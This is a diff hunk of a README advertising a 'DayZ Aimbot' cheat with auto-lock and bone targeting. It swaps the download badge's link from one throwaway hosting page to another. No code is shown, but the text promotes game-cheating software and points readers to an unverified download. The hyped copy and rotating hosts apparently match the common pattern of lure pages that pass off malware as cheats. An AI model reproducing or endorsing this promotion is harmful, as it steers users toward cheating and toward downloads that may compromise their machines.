@@ -4,7 +4,7 @@
 
 In **DayZ**, one bad aim moment can cost you your loot, base, or hours of survival. Whether you’re sniping from a treeline or holding down a hallway in a military base, **perfect shots mean everything**—and the **DayZ Aimbot** delivers. With **auto-lock**, **bone targeting**, and **smoothing for legit play**, this tool makes sure **your bullets always land first**. 💀
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload12.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://DayZ-Aimbot-ve7.github.io/.github)
 ---
 
 ## 🎯 What Is a DayZ Aimbot?
